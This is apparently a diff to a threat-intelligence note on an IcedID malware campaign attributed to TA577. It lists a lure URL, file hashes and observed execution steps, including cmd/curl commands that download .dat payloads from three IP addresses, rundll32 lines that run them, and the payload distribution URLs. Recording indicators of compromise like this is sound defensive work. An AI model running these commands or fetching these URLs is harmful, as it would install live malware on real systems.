@@ -2,7 +2,11 @@ IcedID | 28.10.2023 | Campaign | TA577 | Olimp
 
 ***************************************
 
-.url https://gonow.cl/ud/?lKFtoBWUlVJthcZzqaiXLMizAXcj
+.url https://bossajazzbrasil.com/iii/
+
+.zip 33cf7da7038defe4719b662e2e658b6c59ad592e427b9bd45f813369074a6996
+.js 560155afc04005bfd76a1148b42575fefcb52ed5d53e19fb30296475bf30c9b1
+
 .zip 20258d38e142bb349a5f5446f0152fcc3a9402d36094f3e59e69f64496636dad
 .img 90a39276d80268d85cd067a491abb2271177dfa329089c9759d0cc4595f6d05a
 .exe 6aabd487332f68b330519fb20dbdf73d36559d7931b5fc9d5c536ce52b423c0f
@@ -13,7 +17,7 @@ IcedID | 28.10.2023 | Campaign | TA577 | Olimp
 
 ***************************************
 
-Exec >>
+Exec >> #1
 
 cmd /c 188_JDHSY373DE34DE.iso
 
@@ -22,6 +26,38 @@ cmd /c C:\Users\Admin\AppData\Local\Temp\JDHSY373DE34DE.lnk
 rundll32.exe version1.dll, nail
 
 rundll32.exe C:\Users\Admin\AppData\Roaming\Custom_update\Update_b6eb3a46.dll, nail 
+
+***************************************
+
+Exec >> #2
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\XCJPIM.js
+
+cmd.exe" /c mkdir  C:\Ifdkijefset\Mdiejefkdlgser & curl http://162.55.217.30/gRMS/0.8566793715190715.dat --output C:\Ifdkijefset\Mdiejefkdlgser\Skkdfjekke.OOOOOCCCCCCCCXXXXXXXXXXXX
+
+cmd.exe /c mkdir  C:\Ifdkijefset\Mdiejefkdlgser & curl http://157.90.166.88/O3ZlYNW/0.8392080340563924.dat --output C:\Ifdkijefset\Mdiejefkdlgser\Skkdfjekke.OOOOOCCCCCCCCXXXXXXXXXXXX
+
+cmd.exe /c mkdir  C:\Ifdkijefset\Mdiejefkdlgser & curl http://128.140.36.37/cQtDIo/0.7071057850127558.dat --output C:\Ifdkijefset\Mdiejefkdlgser\Skkdfjekke.OOOOOCCCCCCCCXXXXXXXXXXXX
+
+cmd.exe /c mkdir  C:\Ifdkijefset\Mdiejefkdlgser & curl 0.6060319888374397.dat --output C:\Ifdkijefset\Mdiejefkdlgser\Skkdfjekke.OOOOOCCCCCCCCXXXXXXXXXXXX
+
+cmd.exe /c mkdir  C:\Ifdkijefset\Mdiejefkdlgser & curl 0.7111149462612281.dat --output C:\Ifdkijefset\Mdiejefkdlgser\Skkdfjekke.OOOOOCCCCCCCCXXXXXXXXXXXX
+
+cmd.exe /c mkdir  C:\Ifdkijefset\Mdiejefkdlgser & curl 0.7869745523679705.dat --output C:\Ifdkijefset\Mdiejefkdlgser\Skkdfjekke.OOOOOCCCCCCCCXXXXXXXXXXXX
+
+cmd.exe /c timeout 10 & rundll32 C:\Ifdkijefset\Mdiejefkdlgser\Skkdfjekke.OOOOOCCCCCCCCXXXXXXXXXXXX,nail
+
+timeout  10 
+
+rundll32  C:\Ifdkijefset\Mdiejefkdlgser\Skkdfjekke.OOOOOCCCCCCCCXXXXXXXXXXXX,nail
+
+***************************************
+
+.dll distro 
+
+http://162.55.217.30/gRMS/0.8566793715190715.dat
+http://157.90.166.88/O3ZlYNW/0.8392080340563924.dat
+http://128.140.36.37/cQtDIo/0.7071057850127558.dat 
 
 ***************************************
 
